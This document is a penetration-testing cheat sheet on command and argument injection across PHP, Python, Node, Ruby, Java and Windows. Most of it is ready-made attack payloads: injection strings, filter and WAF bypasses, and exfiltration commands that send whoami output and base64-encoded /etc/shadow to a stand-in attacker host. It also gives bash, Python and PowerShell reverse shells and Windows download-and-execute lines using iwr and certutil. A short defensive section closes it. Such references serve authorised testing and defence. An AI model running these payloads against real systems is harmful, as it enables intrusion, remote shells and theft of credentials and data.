# 29 — Command Injection

The application calls a shell with a string built from user input, and the shell parses your metacharacters as control. Distinct from "argument injection" (where the binary is fixed but unintended flags slip in) — both are covered here.

## Contents

- [Vulnerable shapes](#vulnerable-shapes)
- [Operators](#operators)
- [Detection](#detection)
- [Reading output back](#reading-output-back)
- [Reverse shells via command injection](#reverse-shells-via-command-injection)
- [Filter bypasses](#filter-bypasses)
- [Argument injection](#argument-injection)
- [Windows command injection](#windows-command-injection)
- [OS-aware commands you will reach for](#os-aware-commands-you-will-reach-for)
- [Defending (for the report)](#defending-for-the-report)
- [Sources](#sources)

## Vulnerable shapes

```php
// PHP
system("ping -c 1 " . $_GET['host']);
shell_exec("convert " . $_GET['file'] . " out.png");
exec($cmd);
passthru($cmd);
`{$cmd}`;
popen($cmd, 'r');
```

```python
# Python — only when shell=True or os.system / os.popen / commands
os.system("ping -c 1 " + host)
subprocess.run("ls " + d, shell=True)
subprocess.Popen(f"grep {q} f", shell=True)
```

```node
// Node — exec, execSync; spawn is safe with array args
require('child_process').exec("ls " + dir)
```

```ruby
# Ruby
system("ping -c 1 #{host}")
`ping -c 1 #{host}`
%x{ping -c 1 #{host}}
```

```java
// Java — Runtime.exec(String) goes through a tokenizer; the array form does not.
Runtime.getRuntime().exec("sh -c \"ls " + dir + "\"");
```

Functions that pass an **argument array** (not a single string) and do not invoke a shell are generally safe — `subprocess.run([...], shell=False)`, `child_process.spawn(cmd, [args])`, `Runtime.exec(String[])`.

## Operators

```
;       run next regardless
&&      run next if previous succeeded
||      run next if previous failed
&       run in background, then continue
|       pipe stdout into next
$( )    command substitution, value substituted inline
` `     legacy command substitution
\n      newline = command separator (try URL-encoded %0a)
%0a     URL-encoded newline
```

Quick payloads against `ping -c 1 USER`:

```
;id
&id
| id
|| id
&&id
$(id)
`id`
%0aid%0a
'+id+'
```

If quoted: break out first.

```
"; id; "
'; id; #
"; id #
"`id`"
';|id|'
```

## Detection

Time-based works when output is suppressed:

```
;sleep 5
;ping -c 5 127.0.0.1
&&sleep 5
||sleep 5
$(sleep 5)
`sleep 5`
| sleep 5
%0asleep%205
```

```cmd
& timeout 5
& ping -n 5 127.0.0.1
```

Out-of-band (Burp Collaborator, your own DNS):

```
;curl http://attacker.tld/$(whoami)
;wget http://attacker.tld/$(id)
;dig $(whoami).attacker.tld
;nslookup $(whoami).attacker.tld
;`hostname`.attacker.tld
;ping -c 1 `whoami`.attacker.tld
```

Inline echo to a place you can read:

```
;id > /var/www/html/o.txt; cat /var/www/html/o.txt
;ls / > /tmp/o; cat /tmp/o
```

## Reading output back

When the response shows the command output:

```
;id;
;cat /etc/passwd
&&whoami
|cat /etc/passwd
$(cat /etc/passwd)
```

When it does not:

- Time-based extraction (delay if a guess is correct).
- DNS exfiltration (`curl http://$(whoami).attacker.tld`).
- HTTP exfiltration (`curl http://attacker/?d=$(base64 -w0 /etc/shadow)`).
- Write to a known web-accessible path (`/var/www/html/o.txt`) and read.
- Reverse shell.

## Reverse shells via command injection

Once you have one-shot execution, drop a real shell. Quick options:

```bash
# bash /dev/tcp
;bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Encoded (avoids quoting / WAF on metacharacters)
;bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'

# Python
;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Powershell (Windows target)
&powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);..."
```

See [15 Shells & Payloads](15-shells-and-payloads.md) for the full reverse-shell menu.

## Filter bypasses

### Space stripping

```
${IFS}        bash internal field separator: cat${IFS}/etc/passwd
$IFS$9        works in some shells: cat$IFS$9/etc/passwd
{cat,/etc/passwd}        brace expansion as separator
<<<           here-string sometimes survives strict filters
%09           tab = whitespace
```

### Slash blocked

```
${PATH:0:1}      first char of PATH (usually "/")
${HOME:0:1}      "/" on most systems
$(echo${IFS}-e${IFS}'\57')    "/" via printf-style escape
```

### Specific characters blacklisted

```
; → use && or || or |
| → use ; or && or %0a
` → use $( )
$( ) → use back-ticks

# Quote-only filtering
echo \"PWNED\"                    # backslash-escaped
echo ${IFS}\"PWNED\"
'pw'\"ned\"                        # adjacent quotes concatenate

# Keyword-blacklist 'cat'
ca\t /etc/passwd
ca''t /etc/passwd
"c"a"t" /etc/passwd
/usr/bin/cat /etc/passwd
$0 /etc/passwd  (won't print but worth knowing)
tac /etc/passwd
nl /etc/passwd
sed '' /etc/passwd
xxd /etc/passwd | xxd -r
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
awk 1 /etc/passwd
paste /etc/passwd
column -t /etc/passwd
od -c /etc/passwd
strings /etc/passwd

# Keyword-blacklist 'ls'
echo *
printf '%s\n' *

# Keyword-blacklist 'bash'
/bin/sh -i
/bin/dash -i
/bin/zsh
/bin/bu*sh                         # glob

# Encoded execution
echo 'aWQ=' | base64 -d | bash
$(echo aWQ= | base64 -d)
$(printf '\x69\x64')
$( $(echo 'echo id') )

# Wildcards substituting names
/???/?at /etc/passwd               # /bin/cat /etc/passwd
/???/c?t /???/p?sswd
```

### WAF / parameter filter

URL-encode metacharacters one or two times:

```
%3B  ;
%26  &
%7C  |
%0A  newline
%24  $
%60  `
%2F  /
%2526   double-encoded &
```

Some WAFs decode once; servers decode again — `%252e%252e` survives one decode, becomes `%2e%2e` and finally `..`.

## Argument injection

When the binary is fixed but you supply arguments:

```python
# Vulnerable
subprocess.run(["wget", url], check=True)
```

If `url` is `--use-askpass=/path/to/script`, `wget` runs the script:

```
url=--use-askpass=/usr/bin/id
```

Other classic argument-injection hits:

| Binary | Dangerous flag |
|---|---|
| `wget` | `--use-askpass`, `--config`, `--post-file` |
| `curl` | `-K`, `--config`, `-o`, `--upload-file` |
| `find` | `-exec`, `-execdir` (when input becomes a path arg) |
| `sed` | `-e e`, `-e w`, `--in-place` |
| `tar` | `--checkpoint=1 --checkpoint-action=exec=...` |
| `zip` | `-T --unzip-command=` (in zip < 3.0) |
| `git` | `clone --upload-pack=...`, `clone --config=...` |
| `ssh` | `-o ProxyCommand=...`, `-D`, `-L` |

Mitigation: always pass `--` before user-supplied positional args, and validate values.

## Windows command injection

Operators:

```
&        run next regardless
&&       run next if previous succeeded
||       run next if previous failed
^        line continuation / escape
%var%    cmd variable expansion
"&whoami&"   classic break-out from a quoted argument
```

Useful payloads:

```
& whoami
& ipconfig /all
& tasklist /v
& net user
& powershell -nop -c "iwr http://attacker/x.ps1 | iex"
& certutil -urlcache -split -f http://attacker/f.exe C:\Temp\f.exe
& rundll32 url.dll,FileProtocolHandler http://attacker/
```

PowerShell-specific operators (when input lands in PS):

```
;        statement separator
|        pipeline
&        invocation operator: & "command" args
$( )     subexpression
@( )     array
```

## OS-aware commands you will reach for

```bash
# Linux fingerprint after first execution
id; whoami; hostname; uname -a; cat /etc/os-release; cat /etc/passwd
ip a; netstat -tulnp 2>/dev/null || ss -tlnp
ls -la /home; sudo -l 2>/dev/null
```

```cmd
:: Windows fingerprint
whoami /all
systeminfo
ipconfig /all
net user
net localgroup administrators
tasklist /v
```

## Defending (for the report)

- Avoid invoking a shell — use array-form APIs (`execve`, `subprocess.run([...], shell=False)`, `child_process.spawn(cmd, args)`).
- Allowlist input — accept only known-safe values, not "remove dangerous chars".
- Quote / escape per-shell only as a last resort and use a vetted helper (`shlex.quote`, `escapeshellarg`). Do not roll your own.
- Drop privileges and run the called process under a constrained account / namespace.
- Use seccomp / AppArmor / SELinux to limit blast radius.
- Validate path inputs against a fixed prefix (`startswith(allowed_root)`).

## Sources

- OWASP — Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- HackTricks — Command Injection: https://book.hacktricks.wiki/en/pentesting-web/command-injection/
- PayloadsAllTheThings — Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- GTFOBins (for "what can each common binary do"): https://gtfobins.github.io/
